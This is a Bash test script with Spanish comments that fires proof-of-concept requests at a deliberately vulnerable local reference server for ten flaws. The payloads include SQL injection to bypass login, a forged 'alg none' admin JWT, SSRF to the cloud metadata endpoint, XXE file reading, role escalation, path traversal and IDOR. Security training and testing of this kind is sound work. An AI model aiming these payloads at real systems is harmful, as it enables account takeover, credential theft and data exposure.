#!/usr/bin/env bash
# ===========================================================================
#  Pruebas de las 10 vulnerabilidades. Se ejecutan contra la versión
#  vulnerable de referencia.
#  Uso:
#     # levantar el servidor vulnerable de _vulnerable_baseline en el puerto 3000
#     BASE=http://localhost:3000 ./run_all_pocs.sh
# ===========================================================================
set -u
BASE="${BASE:-http://localhost:3000}"
hr(){ echo "----------------------------------------------------------------"; }

hr; echo "V01 · Inyección SQL, salto del inicio de sesión"
curl -s -X POST "$BASE/api/login" -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"x"}'; echo

# Token normal para las pruebas que requieren sesión iniciada
TOKEN=$(curl -s -X POST "$BASE/api/login" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | sed -E 's/.*"token":"([^"]+)".*/\1/')

hr; echo "V02 · Token de sesión falsificado con permisos de administrador"
FORGED="$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=').$(printf '{"id":1,"role":"admin"}' | base64 | tr '+/' '-_' | tr -d '=')."
curl -s "$BASE/api/users/1" -H "Authorization: Bearer $FORGED"; echo

hr; echo "V03 · Petición forzada hacia un recurso interno"
curl -s "$BASE/api/proxy?url=http://169.254.169.254/latest/meta-data/" -H "Authorization: Bearer $TOKEN"; echo

hr; echo "V04 · Lectura de un archivo del servidor a través del XML"
curl -s -X POST "$BASE/api/xml-upload" -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file://c:/Windows/win.ini">]><username>&xxe;</username>'; echo

hr; echo "V05 · Escalada a administrador"
UTOK=$(curl -s -X POST "$BASE/api/login" -H "Content-Type: application/json" \
  -d '{"username":"user","password":"user123"}' | sed -E 's/.*"token":"([^"]+)".*/\1/')
curl -s -X POST "$BASE/api/users/update" -H "Authorization: Bearer $UTOK" \
  -H "Content-Type: application/json" -d '{"role":"admin"}'; echo

hr; echo "V06 · Lectura de un archivo fuera de la carpeta permitida"
curl -s "$BASE/api/files?file=../package.json"; echo

hr; echo "V07 · Intentos repetidos sin ningún freno"
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code} " -X POST "$BASE/api/login" \
    -H "Content-Type: application/json" -d '{"username":"x","password":"y"}'
done; echo

hr; echo "V08 · Datos personales en el registro, revisar la salida del servidor"
curl -s -o /dev/null -X POST "$BASE/api/login" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
echo "  En el registro del servidor vulnerable aparecen el correo y la cédula en texto plano"

hr; echo "V09 · Lectura del perfil de otro usuario"
curl -s "$BASE/api/users/1" -H "Authorization: Bearer $UTOK"; echo

hr; echo "V10 · Credenciales escritas en el código"
grep -nE "AWS_ACCESS_KEY_ID|JWT_SECRET|DB_PASSWORD" ../../_vulnerable_baseline/app/server.js 2>/dev/null \
  || echo "  Ver el archivo _vulnerable_baseline/app/server.js"
hr
